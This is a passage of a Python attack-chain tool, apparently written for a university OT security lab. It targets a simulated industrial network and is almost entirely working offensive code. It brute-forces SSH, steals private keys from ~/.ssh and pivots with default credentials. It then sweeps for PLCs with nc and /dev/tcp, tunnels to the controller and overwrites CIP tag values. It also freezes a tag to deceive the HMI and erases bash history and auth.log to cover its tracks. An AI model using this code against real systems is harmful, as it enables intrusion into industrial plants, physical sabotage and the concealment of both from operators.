        r.finding = f"Target unreachable — {ip}:{port} timed out"
        err(r.finding)
        return r

    if not wl:
        warn("rockyou.txt not found — running priority-list only")
        wl = "/dev/null"

    found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)

    if found_pw is not None:
        console.print(Panel(
            f"\n[bold white]  ACCESS GRANTED\n\n"
            f"  User  : [bold yellow]{user}[/bold yellow]\n"
            f"  Host  : [bold yellow]{ip}:{port}[/bold yellow]\n"
            f"  Pass  : [bold yellow]{found_pw}[/bold yellow]\n",
            title="[bold white] SSH COMPROMISED [/bold white]",
            border_style="bold green", expand=False, padding=(1, 4),
        ))
        r.status  = "success"
        r.finding = f"Credentials confirmed: {user}:{found_pw}"
        CFG["historian"]["password"] = found_pw
    else:
        r.status  = "failed"
        r.finding = f"No valid password found for {user}@{ip}"
        err(r.finding)

    r.output = r.finding
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian → Hop to IDS — OT Zone Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    hist_ip   = CFG["historian"]["ip"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]
    hist_port = CFG["historian"]["port"]

    ids_ip    = CFG["ids"]["ip"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_port  = CFG["ids"]["port"]

    plc_ip    = CFG["plc"]["ip"]
    findings  = []
    checks    = {"route": False, "ping": False, "syslog": False}

    PORT_VENDOR = {
        "44818": "Allen-Bradley / Rockwell (EtherNet/IP)",
        "102":   "Siemens S7 (ISO-TSAP)",
        "502":   "Modbus TCP Device",
    }
    SKIP_IPS = {ids_ip, "10.20.20.254"}

    try:
        info(f"Connecting to Historian ({hist_ip})...")
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)

        console.print("\n[bold cyan]OT syslog (last 20 lines)[/bold cyan]")
        syslog_out, _, _ = ssh_run(hist_client, "grep '10.20.20' /var/log/syslog | tail -20")
        if syslog_out.strip():
            checks["syslog"] = True
            ok("OT zone syslog entries present")
        else:
            warn("No OT syslog entries — rsyslog forwarding may not be running")
        findings.append(f"Syslog:\n{syslog_out}")

        console.print("\n[bold cyan]Route: Historian → OT zone[/bold cyan]")
        route_out, _, route_rc = ssh_run(hist_client, f"ip route get {ids_ip}")
        if route_rc == 0:
            checks["route"] = True
            ok(f"Route to OT zone ({ids_ip}) exists from Historian")
        else:
            err(f"No route to OT zone from Historian")
        findings.append(f"Route:\n{route_out}")

        console.print("\n[bold cyan]Hopping Historian → IDS (OT zone)[/bold cyan]")
        stolen_pkey: paramiko.PKey | None = None
        console.print("\n[bold cyan]SSH Key Hunt — searching Historian ~/.ssh/[/bold cyan]")
        key_out, _, key_rc = ssh_run(hist_client,
            "ls -la ~/.ssh/id_rsa 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || "
            "ls -la ~/.ssh/id_ed25519 2>/dev/null && cat ~/.ssh/id_ed25519 2>/dev/null || "
            "echo __NO_KEY__")

        if "-----BEGIN" in key_out:
            pem_lines = []
            in_block  = False
            for line in key_out.splitlines():
                if "-----BEGIN" in line:
                    in_block = True
                if in_block:
                    pem_lines.append(line)
                if "-----END" in line and in_block:
                    break
            pem = "\n".join(pem_lines) + "\n"
            try:
                try:
                    stolen_pkey = paramiko.RSAKey.from_private_key(io.StringIO(pem))
                except paramiko.SSHException:
                    stolen_pkey = paramiko.Ed25519Key.from_private_key(io.StringIO(pem))
                ok("[bold green]✔ Stolen SSH Private Key found — attempting passwordless pivot...[/bold green]")
            except Exception as key_parse_err:
                warn(f"Key found but could not parse: {key_parse_err}")
                stolen_pkey = None
        else:
            warn("No private key found on Historian — falling back to password list")

        IDS_FALLBACKS = [
            (ids_user, ids_pass),
            ("pi",      "raspberry"),
            ("pi",      "admin123"),
            ("student", "student"),
            ("admin",   "raspberry"),
        ]

        ids_client = None
        last_exc: Exception | None = None

        if stolen_pkey:
            key_users = list(dict.fromkeys([ids_user, "pi", "admin", "student", "kali"]))
            for ku in key_users:
                try:
                    info(f"Trying stolen key as {ku}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port, ku, pkey=stolen_pkey)
                    if ku != ids_user:
                        CFG["ids"]["username"] = ku
                    CFG["ids"]["password"]    = ""
                    CFG["ids"]["private_key"] = stolen_pkey
                    console.print(Panel(
                        f"[bold white]Method   :[/bold white] [bold green]Stolen SSH Private Key[/bold green]\n"
                        f"[bold white]Username :[/bold white] [bold yellow]{ku}[/bold yellow]\n"
                        f"[bold white]Host     :[/bold white] [bold yellow]{ids_ip}[/bold yellow]\n\n"
                        f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                        title="[bold green] IDS PIVOTED VIA STOLEN KEY [/bold green]",
                        border_style="green", expand=False,
                    ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Key rejected for {ku}@{ids_ip}")
                    last_exc = exc

        if ids_client is None:
            for attempt_user, attempt_pass in IDS_FALLBACKS:
                try:
                    info(f"Trying IDS creds: {attempt_user}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                         attempt_user, attempt_pass)
                    if attempt_user != ids_user or attempt_pass != ids_pass:
                        CFG["ids"]["username"] = attempt_user
                        CFG["ids"]["password"] = attempt_pass
                        console.print(Panel(
                            f"[bold white]Username :[/bold white] [bold yellow]{attempt_user}[/bold yellow]\n"
                            f"[bold white]Password :[/bold white] [bold yellow]{attempt_pass}[/bold yellow]\n\n"
                            f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                            title="[bold yellow] IDS Credentials Auto-Corrected [/bold yellow]",
                            border_style="yellow", expand=False,
                        ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Auth failed: {attempt_user}@{ids_ip}")
                    last_exc = exc

        if ids_client is None:
            raise last_exc

        console.print("\n[bold cyan]OT Fingerprinting Sweep (from IDS — OT zone source)[/bold cyan]")
        nc_check, _, nc_rc = ssh_run(ids_client, "which nc || which ncat || which netcat")
        has_nc = nc_rc == 0 and nc_check.strip()

        if has_nc:
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "nc -z -w 2 10.20.20.$i $p 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"; "
                "done) & "
                "done; wait"
            )
        else:
            warn("nc not found on IDS — using bash /dev/tcp fallback")
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "(bash -c \"echo > /dev/tcp/10.20.20.$i/$p\" 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"); "
                "done) & "
                "done; wait"
            )

        sweep_out, _, _ = ssh_run(ids_client, sweep_cmd, timeout=90)
        discovered_devices: list[dict] = []
        for line in sweep_out.splitlines():
            line = line.strip()
            if ":" not in line:
                continue
            parts = line.split(":")
            if len(parts) != 2:
                continue
            d_ip, d_port = parts[0].strip(), parts[1].strip()
            if not d_ip.startswith("10.20.20."):
                continue
            if d_ip in SKIP_IPS:
                continue
            vendor = PORT_VENDOR.get(d_port, f"Unknown (port {d_port})")
            discovered_devices.append({"ip": d_ip, "port": d_port, "vendor": vendor})

        sweep_table = Table(show_header=True, header_style="bold magenta", border_style="dim")
        sweep_table.add_column("Discovered IP",    style="cyan",  width=18)
        sweep_table.add_column("Open Port",         style="white", width=12)
        sweep_table.add_column("Inferred PLC Type", style="green", width=40)
        for dev in discovered_devices:
            sweep_table.add_row(dev["ip"], dev["port"], dev["vendor"])
        console.print(sweep_table)

        PORT_PRIORITY = ["44818", "502", "102"]
        configured_hits = [d for d in discovered_devices if d["ip"] == plc_ip]
        if configured_hits:
            best = next(
                (h for pp in PORT_PRIORITY for h in configured_hits if h["port"] == pp),
                configured_hits[0],
            )
        else:
            best = None
            for preferred_port in PORT_PRIORITY:
                best = next((d for d in discovered_devices if d["port"] == preferred_port), None)
                if best:
                    break

        if best:
            old_plc_ip = plc_ip
            CFG["plc"]["ip"]   = best["ip"]
            CFG["plc"]["type"] = best["vendor"]
            plc_ip = best["ip"]
            checks["ping"] = True
            if best["ip"] != old_plc_ip:
                console.print(Panel(
                    f"[bold white]Configured IP :[/bold white]  "
                    f"[red]{old_plc_ip}[/red]  (not seen)\n"
                    f"[bold white]Discovered IP :[/bold white]  "
                    f"[bold green]{best['ip']}[/bold green]  port {best['port']}\n"
                    f"[bold white]Vendor        :[/bold white]  {best['vendor']}\n\n"
                    f"[dim]CFG updated — Phase 5 will target {best['ip']}[/dim]",
                    title="[bold yellow] PLC IP AUTO-CORRECTED [/bold yellow]",
                    border_style="yellow", expand=False,
                ))
            else:
                ok(f"PLC confirmed: {best['ip']}  ({best['vendor']}  port {best['port']})")
        else:
            checks["ping"] = False
            err("No recognised industrial devices found (ports 44818/502/102 all closed)")

        findings.append(f"OT Sweep:\n{sweep_out}")

        for af_client in (ids_client, hist_client):
            try:
                ssh_run(af_client,
                        "cat /dev/null > ~/.bash_history; "
                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
                        timeout=5)
            except Exception:
                pass

        ids_client.close()
        hist_client.close()

        if checks["route"] and checks["ping"]:
            r.status  = "success"
            r.finding = f"OT zone confirmed — {plc_ip} ({CFG['plc'].get('type', '?')})"
            ok(r.finding)
        elif not checks["ping"]:
            r.status  = "failed"
            r.finding = "No recognised industrial devices found on the OT subnet"
            err(r.finding)
        else:
            r.status  = "failed"
            r.finding = "No route from Historian to OT zone"
            err(r.finding)

        r.output = "\n".join(findings)

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def _open_cip_tunnel(
    hist_ip: str, hist_user: str, hist_pass: str,
    ids_ip: str,  ids_user: str,  ids_pass: str,
    ids_pkey: "paramiko.PKey | None",
    plc_ip: str,  local_port: int = 44818,
) -> tuple["subprocess.Popen", "str | None"]:
    key_file: str | None = None
    if ids_pkey:
        key_file = "/tmp/ids_rsa"
        with open(key_file, "w") as kf:
            ids_pkey.write_private_key(kf)
        os.chmod(key_file, 0o600)

    run_cmd(f"fuser -k {local_port}/tcp 2>/dev/null || true", capture=False, silent=True)
    time.sleep(0.5)

    ssh_opts  = "-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=no"
    proxy_cmd = (
        f"sshpass -p '{hist_pass}' ssh -W %h:%p "
        f"{ssh_opts} {hist_user}@{hist_ip}"
    )
    fwd       = f"-N -L {local_port}:{plc_ip}:{local_port}"
    proxy_opt = f'-o "ProxyCommand={proxy_cmd}"'

    if key_file:
        cmd = (
            f"ssh {fwd} {ssh_opts} {proxy_opt} "
            f"-i {key_file} {ids_user}@{ids_ip}"
        )
    else:
        cmd = (
            f"sshpass -p '{ids_pass}' ssh {fwd} {ssh_opts} {proxy_opt} "
            f"{ids_user}@{ids_ip}"
        )

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    return proc, key_file


def phase5_plc_attack() -> PhaseResult:
    phase_header(6, "Interactive CIP Attack Console")
    r = PhaseResult("PLC CIP Write")

    plc_ip   = CFG["plc"]["ip"]
    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]
    ids_ip   = CFG["ids"]["ip"]
    ids_port = CFG["ids"]["port"]
    ids_user = CFG["ids"]["username"]
    ids_pass = CFG["ids"]["password"]
    ids_pkey: "paramiko.PKey | None" = CFG["ids"].get("private_key")

    LOCAL_PORT    = 44818
    NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
    CIP_SLOTS     = ["", "/0", "/1", "/2", "/3"]

    console.print(Panel(
        f"[bold white]Target :[/bold white] [bold yellow]{plc_ip}[/bold yellow]\n"
        f"[dim]Establishing tunnel → Interactive Attack Console...[/dim]",
        title="[bold red] PLC Attack Module [/bold red]",
        border_style="red", expand=False,
    ))

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None

    try:
        run_cmd("pkill -f 'ssh -W' 2>/dev/null || true",          capture=False, silent=True)
        run_cmd("pkill -f 'ssh -N -L 44818' 2>/dev/null || true", capture=False, silent=True)

        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )

        info("Waiting 4 s for tunnel to establish...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"ssh tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        from pycomm3 import LogixDriver

        plc_conn    = None
        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path: {path!r}")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                ok(f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                warn(f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(
                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel."
            )

        plc_lock = threading.Lock()

        try:
            info("Enumerating PLC tag list...")
            all_tags = plc_conn.get_tag_list()

            def _tname(t) -> str:
                return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
            def _ttype(t) -> str:
                dt = t.get("data_type", "Unknown") if isinstance(t, dict) else getattr(t, "data_type", "Unknown")
                if isinstance(dt, dict):
                    return str(dt.get("name", "STRUCT"))
                return str(dt)

            display_tags = all_tags
            ok(f"{len(display_tags)} tags loaded")

            def _render_tag_table():
                tbl = Table(
                    title="[bold magenta]PLC Data Table — All Tags[/bold magenta]",
                    show_header=True, header_style="bold cyan", border_style="dim",
                )
                tbl.add_column("#",         style="dim",    width=5,  justify="right")
                tbl.add_column("Tag Name",  style="green",  width=42)
                tbl.add_column("Data Type", style="yellow", width=12)
                for i, t in enumerate(display_tags, 1):
                    tbl.add_row(str(i), _tname(t), _ttype(t))
                console.print(tbl)

            payloads_fired: list[str] = []

            def _cast(raw: str, reference, dtype: str = ""):
                if dtype.upper() == "BOOL" or isinstance(reference, bool):
                    return raw.strip().lower() in ("true", "1", "yes", "on")
                try:
                    if isinstance(reference, float): return float(raw)
                    if isinstance(reference, int):   return int(raw)
                except ValueError:
                    pass
                return raw

            quit_all   = False
            stop_freeze: threading.Event | None = None

            def _stop_stealth():
                nonlocal stop_freeze
                if stop_freeze and not stop_freeze.is_set():
                    stop_freeze.set()
                    time.sleep(0.2)

            while not quit_all:
                _render_tag_table()

                console.print()
                if Confirm.ask(
                    "[bold magenta]Enable HMI Stealth Mode? "
                    "[dim](freeze a tag at a safe value in the background)[/dim][/bold magenta]",
                    default=False,
                ):
                    _stop_stealth()
                    freeze_raw = Prompt.ask(
                        f"[magenta]  Freeze tag # (1–{len(display_tags)})[/magenta]"
                    ).strip()
                    try:
                        freeze_tag = _tname(display_tags[int(freeze_raw) - 1])
                    except (ValueError, IndexError):
                        warn("Invalid index — stealth mode skipped")
                        freeze_tag = None

                    if freeze_tag:
                        with plc_lock:
                            freeze_cur = plc_conn.read(freeze_tag)
                        freeze_cur_val = freeze_cur.value if freeze_cur else 0
                        safe_raw = Prompt.ask(
                            f"[magenta]  Safe value for [bold]{freeze_tag}[/bold] "
                            f"(current: [bold yellow]{freeze_cur_val}[/bold yellow])[/magenta]"
                        ).strip()
                        safe_value = _cast(safe_raw, freeze_cur_val)
                        stop_freeze = threading.Event()

                        def _freeze_loop(tag_name=freeze_tag, val=safe_value,
                                         ev=stop_freeze, lock=plc_lock):
                            while not ev.is_set():
                                try:
                                    with lock:
                                        plc_conn.write((tag_name, val))
                                except Exception:
                                    pass
                                time.sleep(random.uniform(0.003, 0.008))

                        t = threading.Thread(target=_freeze_loop, daemon=True)
                        t.start()
                        console.print(Panel(
                            f"[bold white]Frozen tag :[/bold white] [bold yellow]{freeze_tag}[/bold yellow]\n"
                            f"[bold white]Locked at  :[/bold white] [bold green]{safe_value}[/bold green]\n"
                            f"[bold white]Interval   :[/bold white] 3–8 ms (Randomized Jitter)\n\n"
                            f"[dim]HMI will display {safe_value} while you manipulate other tags[/dim]",
                            title="[bold magenta] HMI STEALTH MODE ACTIVE [/bold magenta]",
                            border_style="magenta", expand=False,
                        ))

                console.print(
                    f"[dim]  Select attack tag (1–{len(display_tags)})  |  [bold]q[/bold] = quit[/dim]"
                )
                raw_idx = Prompt.ask("[yellow]Tag #[/yellow]").strip().lower()

                if raw_idx in ("q", "quit"):
                    _stop_stealth()
                    quit_all = True
                    break

                try:
                    idx = int(raw_idx) - 1
                    if not (0 <= idx < len(display_tags)):
                        raise ValueError
                    selected_tag_obj = display_tags[idx]
                    tag   = _tname(selected_tag_obj)
                    dtype = _ttype(selected_tag_obj)
                except ValueError:
                    warn("Invalid selection — enter a number or 'q'")
                    continue

                CFG["plc"]["tag"] = tag
                is_bool = dtype.upper() == "BOOL"

                while not quit_all:
                    with plc_lock:
                        cur_res = plc_conn.read(tag)
                    cur_val = cur_res.value if cur_res else "unknown"

                    console.print()
                    console.print(
                        f"[dim]  [bold]back[/bold]/[bold]b[/bold] = change tag  |  "
                        f"[bold]q[/bold] = quit[/dim]"
                    )

                    if is_bool:
                        prompt_hint = "[dim](BOOL — [bold]true[/bold]/[bold]false[/bold] or [bold]1[/bold]/[bold]0[/bold])[/dim]"
                    else:
                        prompt_hint = f"[dim](current: [bold yellow]{cur_val}[/bold yellow])[/dim]"

                    raw_val = Prompt.ask(
                        f"[red]  {tag}[/red] [{dtype}] "
                        f"{prompt_hint} → [red]new value[/red]"
                    ).strip().lower()

                    if raw_val in ("q", "quit"):
                        _stop_stealth()
                        quit_all = True
                        break

                    if raw_val in ("b", "back"):
                        _stop_stealth()
                        break

                    inject_val = _cast(raw_val, cur_val, dtype)

                    with plc_lock:
                        before = plc_conn.read(tag)
                        plc_conn.write((tag, inject_val))
                        after  = plc_conn.read(tag)

                    info(f"  Before : {before.value}")
                    ok(f"  After  : [bold green]{after.value}[/bold green]")
                    payloads_fired.append(f"{tag}: {before.value} → {after.value}")

        finally:
            plc_conn.close()

        if payloads_fired:
            r.status  = "success"
            r.finding = "Payloads fired: " + " | ".join(payloads_fired)
            ok(r.finding)
        else:
            r.status  = "skipped"
            r.finding = "No payloads deployed"

        r.output = "\n".join(payloads_fired)

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))
    finally:
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)
            info(f"Removed {key_file}")

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(7, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]
    ids_ip    = CFG["ids"]["ip"]
    ids_port  = CFG["ids"]["port"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_cmd   = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    info(f"Checking Suricata alerts on IDS ({ids_ip}) via Historian hop...")

    try:
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)
        ids_pkey    = CFG["ids"].get("private_key")
        ids_client  = ssh_hop(
            hist_client, ids_ip, ids_port, ids_user,
            target_pass=None if ids_pkey else ids_pass,
            pkey=ids_pkey,
        )

        stdout, _, _ = ssh_run(ids_client, ids_cmd)

        for af_client in (ids_client, hist_client):
            try:
                ssh_run(af_client,
                        "cat /dev/null > ~/.bash_history; "
                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
                        timeout=5)
            except Exception:
                pass

        ids_client.close()
        hist_client.close()

        if stdout.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(stdout)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
            r.status  = "success"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"
            r.status  = "success"

        r.output = stdout

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase5_cip_enum() -> PhaseResult:
    phase_header(5, "CIP Recon — PLC Memory Map")
    r = PhaseResult("CIP Enumerator")

    from pycomm3 import LogixDriver

    plc_ip    = CFG["plc"]["ip"]
    hist_ip   = CFG["historian"]["ip"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]
    ids_ip    = CFG["ids"]["ip"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_pkey  = CFG["ids"].get("private_key")

    LOCAL_PORT = 44818
    CIP_SLOTS  = ["", "/0", "/1", "/2", "/3"]

    def _tname(t) -> str:
        return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
    def _ttype(t) -> str:
        dt = t.get("data_type", "Unknown") if isinstance(t, dict) else getattr(t, "data_type", "Unknown")
        if isinstance(dt, dict):
            return str(dt.get("name", "STRUCT"))
        return str(dt)
    def _is_noise(name: str) -> bool:
        return (name.startswith("__") or "Program:" in name or
                "Routine:" in name or "Task:" in name or "Trend:" in name)

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None
    plc_conn                               = None

    try:
        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )

        info("Waiting 4 s for tunnel to stabilise...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"SSH tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path: {path!r}")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                ok(f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                warn(f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(f"All CIP slot paths failed — PLC at {plc_ip} not responding")

        info("Pulling full tag list from PLC data table...")
        all_tags  = plc_conn.get_tag_list()
        user_tags = [t for t in all_tags if not _is_noise(_tname(t))]

        ok(f"{len(all_tags)} tags total — "
           f"{len(all_tags) - len(user_tags)} system tags suppressed — "
           f"[bold]{len(user_tags)} user-defined tags[/bold]")

        if not user_tags:
            r.status  = "failed"
            r.finding = "No user-defined tags found"
            err(r.finding)
            return r

        info("Reading live values from PLC...")
        tbl = Table(
            title="[bold magenta]Target Environment: PLC Memory Map[/bold magenta]",
            show_header=True, header_style="bold cyan",
            border_style="dim", show_lines=False, padding=(0, 1),
        )
        tbl.add_column("#",          style="dim",    width=5,  justify="right")
        tbl.add_column("Tag Name",   style="green",  width=42)
        tbl.add_column("Data Type",  style="yellow", width=14)
        tbl.add_column("Live Value", style="white",  width=22)

        reads_ok = 0
        reads_denied = 0
        findings_log = []

        for i, tag in enumerate(user_tags, 1):
            name  = _tname(tag)
            dtype = _ttype(tag)
            try:
                result = plc_conn.read(name)
                if result is None or result.value is None:
                    value_str = "[dim]None[/dim]"
                else:
                    value_str = escape(str(result.value))
                    findings_log.append(f"{name} ({dtype}) = {result.value}")
                reads_ok += 1
            except Exception:
                value_str    = "[bold red]ACCESS DENIED[/bold red]"
                reads_denied += 1
            tbl.add_row(str(i), escape(name), escape(dtype), value_str)

        console.print(tbl)
        console.print()
        console.print(Panel(
            f"[bold white]Tags read successfully :[/bold white] [green]{reads_ok}[/green]\n"
            f"[bold white]Access denied          :[/bold white] "
            + (f"[red]{reads_denied}[/red]" if reads_denied else "[dim]0[/dim]") +
            f"\n[bold white]Total user tags        :[/bold white] {len(user_tags)}",
            title="[bold cyan] Enumeration Summary [/bold cyan]",
            border_style="cyan", expand=False,
        ))

        r.status  = "success"
        r.finding = (
            f"{len(user_tags)} user tags enumerated — "
            f"{reads_ok} readable, {reads_denied} denied"
        )
        r.output  = "\n".join(findings_log)

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))
    finally:
        if plc_conn:
            try: plc_conn.close()
            except Exception: pass
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)
            info(f"Removed {key_file}")

    return r


# ── Final report ──────────────────────────────────────────────────────────────

def print_report():
    console.print()
    console.rule("[bold white]  Attack Chain — Final Report  [/bold white]")
    console.print()

    total   = len(results)
    success = sum(1 for r in results if r.status == "success")
    failed  = sum(1 for r in results if r.status == "failed")
    skipped = sum(1 for r in results if r.status == "skipped")
    score   = int((success / total) * 100) if total else 0

    # Score panel
    if score == 100:
        risk_label = "[bold red]CRITICAL — Full chain executed[/bold red]"
        risk_color = "red"
    elif score >= 70:
        risk_label = "[bold yellow]HIGH — Most objectives achieved[/bold yellow]"
        risk_color = "yellow"
    elif score >= 40:
        risk_label = "[bold cyan]MEDIUM — Partial compromise[/bold cyan]"
        risk_color = "cyan"
    else:
        risk_label = "[bold green]LOW — Chain largely blocked[/bold green]"
        risk_color = "green"

    console.print(Panel(
        f"[bold white]Phases run    :[/bold white]  {total}\n"
        f"[bold white]Succeeded     :[/bold white]  [bold green]{success}[/bold green]\n"
        f"[bold white]Failed        :[/bold white]  [bold red]{failed}[/bold red]\n"
        f"[bold white]Skipped       :[/bold white]  [dim]{skipped}[/dim]\n"
        f"[bold white]Chain score   :[/bold white]  [bold]{score}%[/bold]\n"
        f"[bold white]Risk verdict  :[/bold white]  {risk_label}",
        title=f"[bold {risk_color}] Engagement Summary [/bold {risk_color}]",
        border_style=risk_color, expand=False,
    ))
    console.print()

    STATUS_STYLE = {
        "success": ("green",  "✔ SUCCESS"),
        "failed":  ("red",    "✘ FAILED "),
        "skipped": ("yellow", "⊘ SKIPPED"),
        "pending": ("dim",    "● PENDING"),
    }

    table = Table(
        show_header=True, header_style="bold magenta",
        border_style="dim", show_lines=True,
    )
    table.add_column("#",       style="dim",  width=3)
    table.add_column("Phase",   style="cyan", width=26)
    table.add_column("Status",               width=12)
    table.add_column("Finding",              width=58)

    for i, r in enumerate(results, 1):
        color, label = STATUS_STYLE.get(r.status, ("white", r.status.upper()))
        table.add_row(
            str(i),
            r.phase,
            f"[bold {color}]{label}[/bold {color}]",
            escape(r.finding) if r.finding else "[dim]—[/dim]",
        )

    console.print(table)

    # Key findings
    key_findings = [r for r in results if r.status == "success" and r.finding]
    if key_findings:
        console.print()
        console.print(Panel(
            "\n".join(f"  [green]✔[/green]  [dim]{escape(r.finding)}[/dim]"
                      for r in key_findings),
            title="[bold green] Key Findings [/bold green]",
            border_style="green", expand=False,
        ))

    # JSON artifact
    report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = [
        {"phase": r.phase, "status": r.status,
         "finding": r.finding, "ts": r.ts, "output": r.output}
        for r in results
    ]
    with open(report_path, "w") as f:
        json.dump(data, f, indent=2)

    console.print()
    ok(f"JSON report saved: {report_path}")
    console.print()


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",        phase1_wifi_crack),
    (2, "IDMZ Recon",           phase2_idmz_recon),
    (3, "SSH Brute Force",      phase3_ssh_bruteforce),
    (4, "SSH Pivot / OT Recon", phase4_ssh_pivot),
    (5, "CIP Recon — PLC Map",  phase5_cip_enum),
    (6, "PLC CIP Write Attack", phase5_plc_attack),
    (7, "Defense Validation",   phase6_defense_check),
]


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    phase_help = "Run specific phases only. Numbers:\n" + "\n".join(
        f"  {n}  {title}" for n, title, _ in PHASES
    )
    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        metavar="N", help=phase_help,
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts",
    )
    parser.add_argument(
        "--skip-failed", action="store_true",
        help="Auto-continue on phase failure instead of prompting",
    )
    args = parser.parse_args()

    banner()
    preflight_check()

    selected    = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
    _phase_plan_panel(selected)

    chain_start = time.monotonic()

    for n, title, fn in PHASES:
        if n not in selected:
            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
            continue

        if not args.auto and not confirm_phase(n, title):
            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
            continue

        while True:
            phase_start = time.monotonic()
